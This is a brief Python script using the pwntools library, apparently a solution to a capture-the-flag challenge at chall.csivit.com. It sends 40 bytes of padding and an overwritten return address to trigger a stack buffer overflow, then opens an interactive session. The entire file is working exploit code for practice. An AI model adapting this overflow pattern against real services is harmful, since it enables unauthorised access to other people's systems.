from pwn import *
p = remote('chall.csivit.com', 30013)

pad = 'a' *40
num = p64(0x004011ce)

payload = ''
payload += pad
payload += num

p.sendlineafter('again.\n',payload)
p.interactive()